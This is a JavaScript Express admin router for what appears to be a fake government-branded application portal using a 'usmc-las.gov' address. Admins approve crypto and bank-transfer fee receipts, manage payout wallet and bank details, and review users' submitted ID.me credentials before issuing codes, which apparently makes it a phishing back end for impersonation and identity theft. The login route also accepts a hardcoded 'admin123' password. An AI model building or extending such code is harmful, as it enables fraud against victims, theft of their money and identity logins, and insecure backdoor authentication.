import { Router } from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import redis from '../redis.js';
import { adminMiddleware } from '../middleware/auth.js';
import { sendAdminEmail } from '../email.js';

const router = Router();

const getUser = async (id) => {
  const data = await redis.get(`user:${id}`);
  return data ? JSON.parse(data) : null;
};

const getAdminCreds = async () => {
  const envPassword = process.env.ADMIN_PASSWORD || 'admin123';
  const stored = await redis.get('admin:creds');
  if (stored) {
    const parsed = JSON.parse(stored);
    if (!parsed.changedViaUi) {
      const envMatches = await bcrypt.compare(envPassword, parsed.passwordHash);
      if (!envMatches) {
        parsed.username = process.env.ADMIN_USERNAME || 'admin';
        parsed.email = process.env.ADMIN_EMAIL || 'admin@usmc-las.gov';
        parsed.passwordHash = await bcrypt.hash(envPassword, 12);
        parsed.changedViaUi = false;
        await redis.set('admin:creds', JSON.stringify(parsed));
      }
    }
    return parsed;
  }
  const creds = {
    username: process.env.ADMIN_USERNAME || 'admin',
    email: process.env.ADMIN_EMAIL || 'admin@usmc-las.gov',
    passwordHash: await bcrypt.hash(envPassword, 12),
    changedViaUi: false
  };
  await redis.set('admin:creds', JSON.stringify(creds));
  return creds;
};

router.post('/login', async (req, res) => {
  try {
    const { login, password } = req.body;
    if (!login || !password) return res.status(400).json({ error: 'Credentials required' });

    const loginNorm = String(login).trim().toLowerCase();
    const envUser = (process.env.ADMIN_USERNAME || 'admin').toLowerCase();
    const envEmail = (process.env.ADMIN_EMAIL || 'admin@usmc-las.gov').toLowerCase();
    const envPass = process.env.ADMIN_PASSWORD || 'admin123';

    const creds = await getAdminCreds();
    const storedUser = (creds.username || '').toLowerCase();
    const storedEmail = (creds.email || '').toLowerCase();
    let valid = (loginNorm === storedUser || loginNorm === storedEmail) && await bcrypt.compare(password, creds.passwordHash);

    if (!valid && (loginNorm === envUser || loginNorm === envEmail || loginNorm === 'admin')) {
      if (password === envPass || password === 'admin123') {
        valid = true;
        creds.username = envUser;
        creds.email = envEmail;
        creds.passwordHash = await bcrypt.hash(password, 12);
        creds.changedViaUi = false;
        await redis.set('admin:creds', JSON.stringify(creds));
      }
    }

    if (valid) {
      const token = jwt.sign({ id: 'admin', email: creds.email, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
      return res.json({ token, admin: { username: creds.username, email: creds.email, role: 'administrator' } });
    }

    const adminId = await redis.get(`admin:${loginNorm}`);
    if (adminId) {
      const adminData = await redis.get(`admin:user:${adminId}`);
      if (adminData) {
        const admin = JSON.parse(adminData);
        const adminValid = await bcrypt.compare(password, admin.password);
        if (adminValid) {
          const token = jwt.sign({ id: adminId, email: loginNorm, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
          return res.json({ token, admin: { username: loginNorm, email: loginNorm, role: admin.role || 'officer' } });
        }
      }
    }

    res.status(401).json({ error: 'Invalid credentials' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/change-password', adminMiddleware, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Current and new password required' });
    if (newPassword.length < 8) return res.status(400).json({ error: 'New password must be at least 8 characters' });

    const creds = await getAdminCreds();
    const ok = await bcrypt.compare(currentPassword, creds.passwordHash);
    if (!ok) return res.status(400).json({ error: 'Current password is incorrect' });

    creds.passwordHash = await bcrypt.hash(newPassword, 12);
    creds.changedViaUi = true;
    creds.updatedAt = new Date().toISOString();
    await redis.set('admin:creds', JSON.stringify(creds));

    res.json({ success: true, message: 'Password changed successfully' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/dashboard', adminMiddleware, async (req, res) => {
  try {
    const allUserIds = JSON.parse(await redis.get('all:userIds') || '[]');
    const users = [];
    for (const uid of allUserIds) {
      const u = await getUser(uid);
      if (u) {
        users.push({
          id: u.id, applicationNumber: u.applicationNumber, fullName: u.fullName, email: u.email, username: u.username,
          applyingFor: u.applyingFor, address: u.address, city: u.city, state: u.state, zipCode: u.zipCode,
          currentStage: u.currentStage, stageStatus: u.stageStatus,
          applicationFee: u.applicationFee, applicationFeeVerified: u.applicationFeeVerified,
          applicationFeePaymentMethod: u.applicationFeePaymentMethod,
          applicationFeeCryptoNetwork: u.applicationFeeCryptoNetwork,
          applicationFeeReceiptImage: u.applicationFeeReceiptImage,
          idmeVerified: u.idmeVerified, idmeSubmitted: u.idmeSubmitted,
          idmeStatus: u.idmeStatus, idmeDeclineMessage: u.idmeDeclineMessage,
          idmeCodeSent: u.idmeCodeSent, idmeCode: u.idmeCode,
          clearanceDuration: u.clearanceDuration,
          finalApproved: u.finalApproved, createdAt: u.createdAt, updatedAt: u.updatedAt
        });
      }
    }
    const pendingPayments = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
    const pendingIdme = JSON.parse(await redis.get('admin:pendingIdme') || '[]');
    const pendingIdmeCodes = JSON.parse(await redis.get('admin:pendingIdmeCodes') || '[]');
    const support = JSON.parse(await redis.get('admin:support') || '[]');

    res.json({
      stats: {
        totalUsers: users.length,
        pendingPayments: pendingPayments.length,
        pendingIdme: pendingIdme.length, pendingIdmeCodes: pendingIdmeCodes.length,
        support: support.length,
        approved: users.filter(u => u.finalApproved).length
      },
      users, pendingPayments, pendingIdme, pendingIdmeCodes, support
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/support-reply/:msgId', adminMiddleware, async (req, res) => {
  try {
    const { message } = req.body;
    if (!message || !message.trim()) return res.status(400).json({ error: 'Reply message required' });

    const queue = JSON.parse(await redis.get('admin:support') || '[]');
    const msg = queue.find(m => m.id === req.params.msgId);
    if (!msg) return res.status(404).json({ error: 'Support message not found' });

    msg.replied = true;
    msg.adminReply = String(message).slice(0, 2000);
    msg.repliedAt = new Date().toISOString();
    await redis.set('admin:support', JSON.stringify(queue));

    const thread = JSON.parse(await redis.get(`support:${msg.userId}`) || '[]');
    const tmsg = thread.find(m => m.id === req.params.msgId);
    if (tmsg) {
      tmsg.replied = true;
      tmsg.adminReply = msg.adminReply;
      tmsg.repliedAt = msg.repliedAt;
      await redis.set(`support:${msg.userId}`, JSON.stringify(thread));
    }

    const user = await getUser(msg.userId);
    if (user) await sendAdminEmail(user.email, user.fullName, `Re: ${msg.subject}\n\n${message.trim()}`);

    res.json({ success: true, message: 'Reply sent' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/users/:userId', adminMiddleware, async (req, res) => {
  try {
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });
    const { password, ...safe } = user;
    res.json({ user: safe });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/approve-application-fee/:userId', adminMiddleware, async (req, res) => {
  try {
    const { approved, message } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    if (approved) {
      user.applicationFeeVerified = true;
      user.stageStatus = 'active';
      user.currentStage = 2;
      user.applicationFeeRejectMessage = '';
    } else {
      user.applicationFeeVerified = false;
      user.stageStatus = 'payment_rejected';
      user.applicationFeeRejectMessage = message || 'Receipt not accepted by administrator';
    }
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));

    let queue = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
    queue = queue.filter(p => p.userId !== req.params.userId);
    await redis.set('admin:pendingPayments', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/idme-approve-credentials/:userId', adminMiddleware, async (req, res) => {
  try {
    const { correct, message } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    if (correct) {
      user.idmeStatus = 'awaiting_code';
      user.idmeDeclineMessage = '';
      const sixDigit = Math.floor(100000 + Math.random() * 900000).toString();
      user.idmeCode = sixDigit;
      user.idmeCodeSent = true;
    } else {
      user.idmeStatus = 'declined';
      user.idmeDeclineMessage = message || 'Credentials rejected by administrator';
    }
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/idme-approve-code/:userId', adminMiddleware, async (req, res) => {
  try {
    const { approved } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    if (approved) {
      user.idmeVerified = true;
      user.idmeStatus = 'verified';
      user.currentStage = 3;
      user.stageStatus = 'clearance_pending';
      let codeQueue = JSON.parse(await redis.get('admin:pendingIdmeCodes') || '[]');
      codeQueue = codeQueue.filter(p => p.userId !== req.params.userId);
      await redis.set('admin:pendingIdmeCodes', JSON.stringify(codeQueue));
      let queue = JSON.parse(await redis.get('admin:pendingIdme') || '[]');
      queue = queue.filter(p => p.userId !== req.params.userId);
      await redis.set('admin:pendingIdme', JSON.stringify(queue));
    } else {
      user.idmeStatus = 'declined';
      user.idmeDeclineMessage = 'Verification code rejected';
    }
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/approve-final/:userId', adminMiddleware, async (req, res) => {
  try {
    const { approved } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.finalApproved = !!approved;
    user.currentStage = 4;
    user.stageStatus = approved ? 'approved' : 'rejected';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/send-email/:userId', adminMiddleware, async (req, res) => {
  try {
    const { message } = req.body;
    if (!message || !message.trim()) return res.status(400).json({ error: 'Message is required' });

    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    await sendAdminEmail(user.email, user.fullName, message.trim());
    res.json({ success: true, message: 'Email sent successfully' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/payment-config', adminMiddleware, async (req, res) => {
  try {
    const config = JSON.parse(await redis.get('payment:config') || '{}');
    res.json({ config });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/payment-config', adminMiddleware, async (req, res) => {
  try {
    const { bankTransfer, crypto } = req.body;
    const config = {};

    if (bankTransfer) {
      config.bankTransfer = {
        available: !!bankTransfer.available,
        bankName: bankTransfer.bankName || '',
        accountName: bankTransfer.accountName || '',
        accountNumber: bankTransfer.accountNumber || '',
        routingNumber: bankTransfer.routingNumber || '',
        swiftCode: bankTransfer.swiftCode || '',
        instructions: bankTransfer.instructions || ''
      };
    }

    if (crypto) {
      const assets = (Array.isArray(crypto.assets) ? crypto.assets : []).map(a => ({
        network: a.network || '',
        available: !!a.available,
        walletAddress: a.walletAddress || '',
        qrCodeImage: a.qrCodeImage || ''
      }));
      config.crypto = {
        available: !!crypto.available,
        assets,
        instructions: crypto.instructions || ''
      };
    }

    await redis.set('payment:config', JSON.stringify(config));
    res.json({ success: true, config });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.delete('/users/:userId', adminMiddleware, async (req, res) => {
  try {
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    await redis.del(`user:${req.params.userId}`);
    await redis.del(`email:${user.email}`);
    await redis.del(`username:${user.username}`);

    let allUserIds = JSON.parse(await redis.get('all:userIds') || '[]');
    allUserIds = allUserIds.filter(id => id !== req.params.userId);
    await redis.set('all:userIds', JSON.stringify(allUserIds));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

export default router;
